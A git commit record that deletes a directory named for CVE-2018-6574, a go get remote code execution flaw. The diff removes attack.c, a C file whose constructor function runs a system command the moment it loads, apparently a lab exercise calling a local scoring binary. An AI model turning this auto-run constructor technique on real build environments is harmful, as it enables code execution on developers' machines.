9a83089cce9e62b1f32af7c942dec5069135a544
doantung99 <42331082+doantung99@users.noreply.github.com>
2024-03-11 16:31:50 +0700

    Delete CVE-2018-6574-go-get-RCE-main directory

--- CVE-2018-6574-go-get-RCE-main/attack.c
+++
@@ -1,8 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 1f9dc190-33d6-45b1-ae36-feb0a07487a1");
-}
